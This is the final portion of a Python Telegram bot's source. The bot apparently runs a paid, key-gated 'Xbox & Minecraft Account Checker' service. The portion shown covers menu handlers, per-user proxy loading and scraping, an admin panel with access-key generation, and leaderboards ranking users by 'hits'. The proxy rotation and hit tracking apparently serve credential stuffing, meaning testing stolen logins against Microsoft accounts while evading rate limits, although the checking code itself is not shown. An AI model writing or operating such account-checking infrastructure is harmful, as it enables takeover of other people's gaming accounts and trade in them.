    await message.answer(stats_text, reply_markup=get_main_keyboard(user_id), parse_mode="HTML")

@dp.message(F.text == f"{EMOJIS['about']} About Bot")
async def menu_about(message: types.Message, viewer_id: Optional[int] = None):
    user_id = viewer_id if viewer_id is not None else message.from_user.id
    about_text = f"""{EMOJIS['about']} <b>About {BOT_NAME}</b>
╔════════════════════════════════
║ {EMOJIS['xbox']} Xbox & Minecraft Account Checker
║ {EMOJIS['info']} Version: {BOT_VERSION}
║ {EMOJIS['owner']} Owner: {owner_label(user_id)}
╠════════════════════════════════
║ {EMOJIS['check']} <b>Features:</b>
║ • Check Xbox & Minecraft accounts
║ • Get Gamertag, UUID, Capes
║ • Detect Game Pass & Subscriptions
║ • Multi-threaded checking
║ • Auto-save results by category
║ • {EMOJIS['queue']} Queue System with Admin Priority
║ • {EMOJIS['proxy']} Per-User Proxy Support (HTTP/SOCKS4/SOCKS5)
║ • {EMOJIS['scrape']} Auto Proxy Scraper per user
╠════════════════════════════════
║ {EMOJIS['key']} <b>Access:</b> Key Based System
║ • Use /redeem KEY to activate
║ • Contact owner to get a key
║ • Admins have queue priority
╚════════════════════════════════
{EMOJIS['channel']} Channel: {BOT_CHANNEL}
{EMOJIS['owner']} Contact: {owner_label(user_id)}"""

    await message.answer(about_text, reply_markup=get_main_keyboard(user_id), parse_mode="HTML")

@dp.message(F.text == f"{EMOJIS['owner']} Owner")
async def menu_owner(message: types.Message):
    await send_owner_info(message, message.from_user.id)

async def send_owner_info(message: types.Message, viewer_id: int):
    if should_hide_owner_info(viewer_id):
        owner_text = (
            f"{EMOJIS['owner']} <b>Bot Owner</b>\n\n"
            f"{EMOJIS['info']} Owner details are hidden for this chat.\n"
            f"{EMOJIS['channel']} Channel: {BOT_CHANNEL}"
        )
    else:
        owner_text = (
            f"{EMOJIS['owner']} <b>Bot Owner</b>\n\n"
            f"{EMOJIS['user']} <b>Name:</b> {OWNER_NAME}\n"
            f"{EMOJIS['link']} <b>Username:</b> {OWNER_USERNAME}\n\n"
            f"{EMOJIS['info']} <b>Contact for:</b>\n"
            f"• Get Access Keys\n"
            f"• Support & Help\n"
            f"• Bug Reports\n"
            f"• Suggestions\n\n"
            f"{EMOJIS['channel']} Channel: {BOT_CHANNEL}"
        )

    await message.answer(
        owner_text,
        reply_markup=get_main_keyboard(viewer_id),
        parse_mode="HTML"
    )

@dp.message(F.text == f"{EMOJIS['admin']} Admin Panel")
async def menu_admin_panel(message: types.Message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        await message.answer(f"{EMOJIS['error']} <b>Unauthorized!</b>\nYou are not a bot admin.", parse_mode="HTML")
        return
    
    await message.answer(
        f"{EMOJIS['admin']} <b>Admin Panel</b>\n\nSelect an option:",
        reply_markup=get_admin_inline_menu(),
        parse_mode="HTML"
    )

# ─── ⭐ PER-USER Proxy Menu Handlers ───

@dp.message(F.text == f"{EMOJIS['proxy']} Proxy Settings")
async def menu_proxy_settings(message: types.Message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    current_type = user.get("proxy_type", "none")
    proxy_count = len(user.get("proxies", []))
    
    proxy_info = f"""
{EMOJIS['proxy']} <b>Your Proxy Settings</b>

{EMOJIS['stats']} <b>Current Proxy Type:</b> {current_type.upper() if current_type != 'none' else 'None'}
{EMOJIS['database']} <b>Proxies Loaded:</b> {proxy_count}

<b>Available Proxy Types:</b>
• {EMOJIS['http']} HTTP - Standard HTTP/HTTPS proxies
• {EMOJIS['socks4']} SOCKS4 - SOCKS4 proxies
• {EMOJIS['socks5']} SOCKS5 - SOCKS5 proxies
• {EMOJIS['none']} None - Direct connection (no proxy)

<b>How to use:</b>
1. Select a proxy type below (✅ shows current)
2. Load proxies from a file
3. Or use Scrape Proxies to get proxies

<b>Commands:</b>
• /loadproxies - Load from file
• /scrape - Auto scrape proxies
• /proxytype - Set proxy type
• /proxyinfo - Show your proxy status
"""
    
    await message.answer(proxy_info, reply_markup=get_user_proxy_keyboard(user_id), parse_mode="HTML")

@dp.message(F.text.startswith(f"{EMOJIS['http']} HTTP"))
async def proxy_set_http_user(message: types.Message):
    user_id = message.from_user.id
    set_user_proxy_type(user_id, "http")
    await message.answer(f"{EMOJIS['success']} <b>Your Proxy Type set to:</b> HTTP\n\nNow load proxies or use /scrape to get proxies.", reply_markup=get_user_proxy_keyboard(user_id), parse_mode="HTML")

@dp.message(F.text.startswith(f"{EMOJIS['socks4']} SOCKS4"))
async def proxy_set_socks4_user(message: types.Message):
    user_id = message.from_user.id
    set_user_proxy_type(user_id, "socks4")
    await message.answer(f"{EMOJIS['success']} <b>Your Proxy Type set to:</b> SOCKS4\n\nNow load proxies or use /scrape to get proxies.", reply_markup=get_user_proxy_keyboard(user_id), parse_mode="HTML")

@dp.message(F.text.startswith(f"{EMOJIS['socks5']} SOCKS5"))
async def proxy_set_socks5_user(message: types.Message):
    user_id = message.from_user.id
    set_user_proxy_type(user_id, "socks5")
    await message.answer(f"{EMOJIS['success']} <b>Your Proxy Type set to:</b> SOCKS5\n\nNow load proxies or use /scrape to get proxies.", reply_markup=get_user_proxy_keyboard(user_id), parse_mode="HTML")

@dp.message(F.text.startswith(f"{EMOJIS['none']} None"))
async def proxy_set_none_user(message: types.Message):
    user_id = message.from_user.id
    set_user_proxy_type(user_id, "none")
    user = db.get_user(user_id)
    user["proxies"] = []
    db.save_all()
    await message.answer(f"{EMOJIS['success']} <b>Your Proxy Type set to:</b> None (Direct connection)\n\nProxies cleared.", reply_markup=get_user_proxy_keyboard(user_id), parse_mode="HTML")

@dp.message(F.text == f"{EMOJIS['load']} Load Proxies")
async def proxy_load_file_user(message: types.Message):
    user_id = message.from_user.id
    await message.answer(
        f"{EMOJIS['load']} <b>Load Proxies For Your Account</b>\n\n"
        "Please send a .txt file with proxies.\n"
        "Format: <code>ip:port</code> (one per line)\n\n"
        "Example:\n"
        "<code>192.168.1.1:8080</code>\n"
        "<code>10.0.0.1:3128</code>\n\n"
        f"Type <code>cancel</code> to cancel.",
        parse_mode="HTML"
    )
    
    @dp.message(F.document & F.document.file_name.endswith(".txt"))
    async def handle_user_proxy_file(message: types.Message):
        user_id = message.from_user.id
        file_id = message.document.file_id
        file_name = message.document.file_name
        
        status_msg = await message.answer(f"{EMOJIS['processing']} <b>Downloading proxy file...</b>", parse_mode="HTML")
        
        file_path = await download_file_safely(file_id, file_name)
        
        if not file_path:
            await status_msg.edit_text(f"{EMOJIS['error']} <b>Failed to download file!</b>", parse_mode="HTML")
            return
        
        success, msg = load_user_proxies(user_id, file_path)
        
        user = db.get_user(user_id)
        proxy_type = user.get("proxy_type", "none")
        
        if success:
            await status_msg.edit_text(f"{EMOJIS['success']} <b>{msg}</b>\n\n{EMOJIS['proxy']} Your Proxy Type: {proxy_type.upper() if proxy_type != 'none' else 'None'}", parse_mode="HTML")
        else:
            await status_msg.edit_text(f"{EMOJIS['error']} <b>{msg}</b>", parse_mode="HTML")
        
        if os.path.exists(file_path):
            os.remove(file_path)
    
    @dp.message(F.text == "cancel")
    async def cancel_user_proxy_load(message: types.Message):
        await message.answer(f"{EMOJIS['error']} Cancelled.", reply_markup=get_main_keyboard(message.from_user.id))

@dp.message(F.text == f"{EMOJIS['scrape']} Scrape Proxies")
async def proxy_scrape_user(message: types.Message):
    user_id = message.from_user.id
    status_msg = await message.answer(f"{EMOJIS['processing']} <b>Scraping proxies for your account from APIs...</b>\n\nThis may take 10-15 seconds...", parse_mode="HTML")
    
    count = await asyncio.to_thread(scrape_user_proxies, user_id)
    
    user = db.get_user(user_id)
    proxy_type = user.get("proxy_type", "none")
    
    if count > 0:
        await status_msg.edit_text(
            f"{EMOJIS['success']} <b>Scraped {count} proxies for your account!</b>\n\n"
            f"{EMOJIS['proxy']} Your Proxy Type: {proxy_type.upper() if proxy_type != 'none' else 'None'}\n"
            f"{EMOJIS['database']} Total Proxies: {count}\n\n"
            f"Now you can start checking accounts with your proxies!",
            parse_mode="HTML"
        )
    else:
        await status_msg.edit_text(
            f"{EMOJIS['error']} <b>Failed to scrape proxies!</b>\n\n"
            "Please try again or load proxies manually using 'Load Proxies' button.",
            parse_mode="HTML"
        )

@dp.message(F.text == f"{EMOJIS['status']} My Proxy Status")
async def proxy_status_user(message: types.Message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    proxy_type = user.get("proxy_type", "none")
    proxylist = user.get("proxies", [])
    
    proxy_info = f"""
{EMOJIS['status']} <b>Your Proxy Status</b>

{EMOJIS['proxy']} <b>Proxy Type:</b> {proxy_type.upper() if proxy_type != 'none' else 'None'}
{EMOJIS['database']} <b>Proxies Loaded:</b> {len(proxylist)}

<b>Sample Proxies (first 5):</b>
"""
    if proxylist:
        for i, p in enumerate(proxylist[:5], 1):
            proxy_info += f"{i}. {p}\n"
        if len(proxylist) > 5:
            proxy_info += f"... and {len(proxylist) - 5} more\n"
    else:
        proxy_info += "No proxies loaded.\n"
    
    proxy_info += f"""
{EMOJIS['pencil']} <b>Commands:</b>
• /loadproxies - Load from file
• /scrape - Auto scrape proxies
• /proxytype - Set proxy type
"""
    
    await message.answer(proxy_info, reply_markup=get_user_proxy_keyboard(user_id), parse_mode="HTML")

@dp.message(F.text == f"{EMOJIS['back']} Back to Menu")
async def proxy_back_to_menu_user(message: types.Message):
    user_id = message.from_user.id
    await message.answer(f"{EMOJIS['menu']} <b>Main Menu</b>", reply_markup=get_main_keyboard(user_id), parse_mode="HTML")

# ─── Proxy Commands (Per-User) ───

@dp.message(Command("loadproxies"))
async def cmd_loadproxies_user(message: types.Message, command: CommandObject):
    user_id = message.from_user.id
    
    if not command.args:
        await message.answer(
            f"{EMOJIS['load']} <b>Load Proxies For Your Account</b>\n\n"
            "Usage: <code>/loadproxies file_path</code>\n"
            "Example: <code>/loadproxies proxies.txt</code>\n\n"
            "File format: ip:port (one per line)",
            parse_mode="HTML"
        )
        return
    
    file_path = command.args.strip()
    
    if not os.path.exists(file_path):
        await message.answer(f"{EMOJIS['error']} File not found: {file_path}", parse_mode="HTML")
        return
    
    success, msg = load_user_proxies(user_id, file_path)
    await message.answer(f"{EMOJIS['success'] if success else EMOJIS['error']} <b>{msg}</b>", parse_mode="HTML")

@dp.message(Command("scrape"))
async def cmd_scrape_user(message: types.Message):
    user_id = message.from_user.id
    status_msg = await message.answer(f"{EMOJIS['processing']} <b>Scraping proxies for your account...</b>", parse_mode="HTML")
    
    count = await asyncio.to_thread(scrape_user_proxies, user_id)
    
    if count > 0:
        await status_msg.edit_text(
            f"{EMOJIS['success']} <b>Scraped {count} proxies for your account!</b>\n\n"
            f"{EMOJIS['database']} Total: {count} proxies",
            parse_mode="HTML"
        )
    else:
        await status_msg.edit_text(f"{EMOJIS['error']} <b>Failed to scrape proxies!</b>", parse_mode="HTML")

@dp.message(Command("proxytype"))
async def cmd_proxytype_user(message: types.Message, command: CommandObject):
    user_id = message.from_user.id
    
    if not command.args:
        await message.answer(
            f"{EMOJIS['proxy']} <b>Set Your Proxy Type</b>\n\n"
            "Usage: <code>/proxytype type</code>\n\n"
            "Available types:\n"
            f"• <code>http</code> - {EMOJIS['http']} HTTP/HTTPS proxies\n"
            f"• <code>socks4</code> - {EMOJIS['socks4']} SOCKS4 proxies\n"
            f"• <code>socks5</code> - {EMOJIS['socks5']} SOCKS5 proxies\n"
            f"• <code>none</code> - {EMOJIS['none']} Direct connection\n\n"
            "Example: <code>/proxytype socks5</code>",
            parse_mode="HTML"
        )
        return
    
    new_type = command.args.strip().lower()
    
    if new_type in ["http", "socks4", "socks5", "none"]:
        if new_type == "none":
            user = db.get_user(user_id)
            user["proxies"] = []
            db.save_all()
        set_user_proxy_type(user_id, new_type)
        await message.answer(
            f"{EMOJIS['success']} <b>Your Proxy Type set to:</b> {new_type.upper() if new_type != 'none' else 'None'}\n"
            f"{EMOJIS['database']} Proxies loaded: {len(db.get_user(user_id).get('proxies', []))}",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            f"{EMOJIS['error']} Invalid proxy type!\n\n"
            "Available: http, socks4, socks5, none",
            parse_mode="HTML"
        )

@dp.message(Command("proxyinfo"))
async def cmd_proxyinfo_user(message: types.Message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    proxy_type = user.get("proxy_type", "none")
    proxylist = user.get("proxies", [])
    
    proxy_info = f"""
{EMOJIS['status']} <b>Your Proxy Info</b>

{EMOJIS['proxy']} <b>Type:</b> {proxy_type.upper() if proxy_type != 'none' else 'None'}
{EMOJIS['database']} <b>Loaded:</b> {len(proxylist)}
"""
    await message.answer(proxy_info, parse_mode="HTML")

# ─── Inline Callback Handlers ───

@dp.callback_query(F.data == "menu_check")
async def inline_check(callback: types.CallbackQuery):
    await callback.answer()
    await menu_check_account(callback.message, callback.from_user.id)

@dp.callback_query(F.data == "menu_file")
async def inline_file(callback: types.CallbackQuery):
    await callback.answer()
    await menu_check_file(callback.message, callback.from_user.id)

@dp.callback_query(F.data == "menu_stats")
async def inline_stats(callback: types.CallbackQuery):
    await callback.answer()
    await menu_stats(callback.message, callback.from_user.id)

@dp.callback_query(F.data == "menu_help")
async def inline_help(callback: types.CallbackQuery):
    await callback.answer()
    await menu_about(callback.message, callback.from_user.id)

@dp.callback_query(F.data == "menu_owner")
async def inline_owner(callback: types.CallbackQuery):
    await callback.answer()
    await send_owner_info(callback.message, callback.from_user.id)

@dp.callback_query(F.data == "menu_queue")
async def inline_queue(callback: types.CallbackQuery):
    await callback.answer()
    await menu_queue_status(callback.message, callback.from_user.id)

@dp.callback_query(F.data == "menu_back")
async def inline_back(callback: types.CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    await callback.message.edit_text(
        f"{EMOJIS['menu']} <b>Main Menu</b>",
        reply_markup=get_inline_menu(),
        parse_mode="HTML"
    )
    await callback.message.answer(
        f"{EMOJIS['star']} <b>Main Menu</b>",
        reply_markup=get_main_keyboard(user_id),
        parse_mode="HTML"
    )

# ─── Admin Callback Handlers ───

@dp.callback_query(F.data == "admin_gen_key")
async def admin_gen_key(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer(f"{EMOJIS['error']} Unauthorized!", show_alert=True)
        return

    if not is_owner(user_id):
        await callback.answer(f"{EMOJIS['error']} Only owner can generate keys!", show_alert=True)
        return

    await callback.message.edit_text(
        f"{EMOJIS['gift']} <b>Generate Key</b>\n\n"
        "Use: <code>/genkey hours,max_uses</code>\n"
        "Example: <code>/genkey 24,100</code> (24 hours, 100 uses max)\n"
        "Example: <code>/genkey 72</code> (72 hours, unlimited uses)\n\n"
        "📌 <b>Available durations:</b>\n"
        "• 1, 6, 12, 24, 72, 168 hours\n"
        "• Any custom duration works\n\n"
        f"{EMOJIS['back']} Use /admin to go back",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_queue")
async def admin_queue(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer(f"{EMOJIS['error']} Unauthorized!", show_alert=True)
        return
    
    status = check_queue.get_queue_status()
    
    text = f"{EMOJIS['queue']} <b>Queue Status</b>\n"
    text += f"╔════════════════════════════════\n"
    text += f"║ {EMOJIS['stats']} <b>Total Pending:</b> {status['total']}\n"
    text += f"║ {EMOJIS['admin_user']} <b>Admin Tasks:</b> {status['admins']}\n"
    text += f"║ {EMOJIS['user']} <b>User Tasks:</b> {status['users']}\n"
    text += f"╠════════════════════════════════\n"
    
    if status['pending']:
        text += f"║ <b>Pending Tasks:</b>\n"
        for i, task in enumerate(status['pending'][:10], 1):
            is_admin_task = task['priority'] == 0
            prefix = EMOJIS['admin_user'] if is_admin_task else EMOJIS['user']
            text += f"║ {prefix} #{i} User: {task['user_id']}\n"
        if len(status['pending']) > 10:
            text += f"║ ... and {len(status['pending']) - 10} more\n"
    else:
        text += f"║ {EMOJIS['success']} Queue is empty\n"
    
    text += f"╚════════════════════════════════"
    
    await callback.message.edit_text(text, reply_markup=get_admin_inline_menu(), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer(f"{EMOJIS['error']} Unauthorized!", show_alert=True)
        return

    stats = db.get_stats()
    
    stats_text = f"""{EMOJIS['stats']} <b>Bot Statistics</b>
╔════════════════════════════════
║ {EMOJIS['users']} <b>Total Users:</b> {stats['total_users']}
║ {EMOJIS['success']} <b>Active Users:</b> {stats['active_users']}
║ {EMOJIS['stats']} <b>Total Checks:</b> {stats['total_checks']}
║ {EMOJIS['target']} <b>Total Hits:</b> {stats['total_hits']}
║ {EMOJIS['gift']} <b>Generated Keys:</b> {stats['total_keys']}
║ {EMOJIS['key']} <b>Keys Issued:</b> {stats['total_issued']}
╠════════════════════════════════
║ {EMOJIS['queue']} <b>Queue Status:</b>
║ {EMOJIS['waiting']} Pending: {check_queue.get_queue_length()}
╚════════════════════════════════

{EMOJIS['trophy']} <b>Top Users:</b>
{chr(10).join([f"{i+1}. @{name} - {hits} hits" for i, (uid, hits, name) in enumerate(stats['top_users'])])}

{EMOJIS['calendar']} <b>Updated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""

    await callback.message.edit_text(stats_text, reply_markup=get_admin_inline_menu(), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "admin_users")
async def admin_users(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer(f"{EMOJIS['error']} Unauthorized!", show_alert=True)
        return

    users_list = []
    for uid, data in list(db.users.items())[:20]:
        username = data.get("username", "N/A")
        total_checks = data.get("total_checks", 0)
        hits = data.get("hits", 0)
        has_key = db.has_active_key(int(uid))
        is_admin_user = is_admin(int(uid))
        proxy_type = data.get("proxy_type", "none")
        proxy_count = len(data.get("proxies", []))
        
        status = EMOJIS['admin_user'] if is_admin_user else (EMOJIS['success'] if has_key else EMOJIS['error'])
        proxy_indicator = f"🌐{proxy_type[:3]}" if proxy_type != "none" else "🚫"
        users_list.append(f"{status} {EMOJIS['gem']} {uid[:8]}... | @{username} | {EMOJIS['stats']}{total_checks} | {EMOJIS['target']}{hits} | {proxy_indicator}")

    text = f"{EMOJIS['users']} <b>Users (First 20)</b>\n\n" + "\n".join(users_list)
    if len(db.users) > 20:
        text += f"\n\n... and {len(db.users) - 20} more users"

    await callback.message.edit_text(text, reply_markup=get_admin_inline_menu(), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "admin_top")
async def admin_top(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer(f"{EMOJIS['error']} Unauthorized!", show_alert=True)
        return

    sorted_users = sorted(db.users.items(), key=lambda x: x[1].get("hits", 0), reverse=True)[:10]
    text = f"{EMOJIS['trophy']} <b>Top Users by Hits</b>\n\n"
    for i, (uid, data) in enumerate(sorted_users, 1):
        username = data.get("username", "N/A")
        hits = data.get("hits", 0)
        total_checks = data.get("total_checks", 0)
        efficiency = f"{(hits / total_checks * 100):.1f}%" if total_checks > 0 else "0%"
        is_admin_user = is_admin(int(uid))
        if is_admin_user:
            medal = EMOJIS['admin_user']
        elif i == 1:
            medal = EMOJIS['medal']
        elif i == 2:
            medal = "🥈"
        elif i == 3:
            medal = "🥉"
        else:
            medal = f"{i}."
        text += f"{medal} @{username} {EMOJIS['success']} - {hits} hits ({efficiency})\n"

    await callback.message.edit_text(text, reply_markup=get_admin_inline_menu(), parse_mode="HTML")
    await callback.answer()

@dp.callback_query(F.data == "admin_extend")
async def admin_extend(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer(f"{EMOJIS['error']} Unauthorized!", show_alert=True)
        return

    await callback.message.edit_text(
        f"{EMOJIS['clock']} <b>Extend User Access</b>\n\n"
        "Enter the user ID and hours to add:\n"
        "Format: <code>user_id,hours</code>\n"
        "Example: <code>123456789,24</code> (adds 24 hours)\n\n"
        f"{EMOJIS['back']} Use /admin to go back",
        parse_mode="HTML"
    )
    await callback.answer()

    @dp.message(F.text & F.text.contains(","))
    async def handle_extend(message: types.Message):
        if not is_admin(message.from_user.id):
            await message.answer(f"{EMOJIS['error']} Unauthorized!")
            return

        try:
            parts = message.text.strip().split(",")
            target_user = int(parts[0].strip())
            hours = int(parts[1].strip())

            if hours <= 0:
                await message.answer(f"{EMOJIS['error']} Hours must be positive!")
                return

            if db.extend_key(target_user, hours):
                user = db.get_user(target_user)
                await message.answer(
                    f"{EMOJIS['success']} <b>Access Extended!</b>\n\n"
                    f"{EMOJIS['user']} <b>User:</b> {target_user}\n"
                    f"{EMOJIS['clock']} <b>Added:</b> +{hours} hours\n"
                    f"{EMOJIS['access']} <b>Access:</b> Active",
                    reply_markup=get_admin_inline_menu(),
                    parse_mode="HTML"
                )
            else:
                await message.answer(
                    f"{EMOJIS['error']} <b>User has no keys!</b>\n\n"
                    f"{EMOJIS['user']} <b>User:</b> {target_user}\n"
                    f"Generate a key for this user first.",
                    parse_mode="HTML"
                )
        except ValueError:
            await message.answer(f"{EMOJIS['error']} Invalid format! Use: <code>user_id,hours</code>", parse_mode="HTML")

@dp.callback_query(F.data == "admin_keys")
async def admin_keys(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if not is_admin(user_id):
        await callback.answer(f"{EMOJIS['error']} Unauthorized!", show_alert=True)
        return

    keys_list = []
    for key, data in list(db.keys.items())[:10]:
        duration = data.get("duration_hours", 0)
        used = data.get("used_count", 0)
        max_uses = data.get("max_uses", "∞")
        is_active = data.get("is_active", True)
        status = f"{EMOJIS['success']} Active" if is_active else f"{EMOJIS['error']} Inactive"
        days = duration // 24 if duration >= 24 else 0
        hours_text = f"{days}d" if days > 0 else f"{duration}h"
        keys_list.append(f"{EMOJIS['key']} <code>{key[:12]}...</code> | {hours_text} | {used}/{max_uses} | {status}")

    text = f"{EMOJIS['gift']} <b>Generated Keys</b>\n\n" + "\n".join(keys_list)
    if len(db.keys) > 10:
        text += f"\n\n... and {len(db.keys) - 10} more keys"

    await callback.message.edit_text(text, reply_markup=get_admin_inline_menu(), parse_mode="HTML")
    await callback.answer()

# ─── Extra: User Proxy Status Button Handler ───

@dp.message(F.text.startswith("📊 "))
async def handle_proxy_indicator(message: types.Message):
    """Handle the proxy indicator button click"""
    user_id = message.from_user.id
    user = db.get_user(user_id)
    proxy_type = user.get("proxy_type", "none")
    proxylist = user.get("proxies", [])
    
    proxy_info = f"""
{EMOJIS['status']} <b>Your Proxy Status</b>

{EMOJIS['proxy']} <b>Proxy Type:</b> {proxy_type.upper() if proxy_type != 'none' else 'None'}
{EMOJIS['database']} <b>Proxies Loaded:</b> {len(proxylist)}

<b>Sample Proxies (first 5):</b>
"""
    if proxylist:
        for i, p in enumerate(proxylist[:5], 1):
            proxy_info += f"{i}. {p}\n"
        if len(proxylist) > 5:
            proxy_info += f"... and {len(proxylist) - 5} more\n"
    else:
        proxy_info += "No proxies loaded.\n"
    
    await message.answer(proxy_info, reply_markup=get_main_keyboard(user_id), parse_mode="HTML")

# ══════════════════════════════════════════════
# MAIN

async def main():
    logger.info(
        "Starting %s | admins=%d | queue_limit=%d | concurrency=%d",
        BOT_NAME,
        len(ADMIN_IDS),
        MAX_PENDING_TASKS,
        THREAD_COUNT,
    )
    for aid in ADMIN_IDS:
        owner_tag = " (Owner)" if aid in OWNER_IDS else ""
        logger.info("Configured admin: %s%s", aid, owner_tag)

    asyncio.create_task(process_queue())

    retry_delay = 1
    while True:
        try:
            logger.info("Starting Telegram polling")
            await dp.start_polling(bot)
            logger.warning("Telegram polling stopped; restarting")
            retry_delay = 1
        except (KeyboardInterrupt, SystemExit):
            raise
        except Exception:
            logger.exception(
                "Telegram polling crashed; retrying in %s seconds",
                retry_delay,
            )
            await asyncio.sleep(retry_delay)
            retry_delay = min(retry_delay * 2, 30)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Stopped by user")
    except Exception as e:
        logger.exception("Fatal error: %s", e)
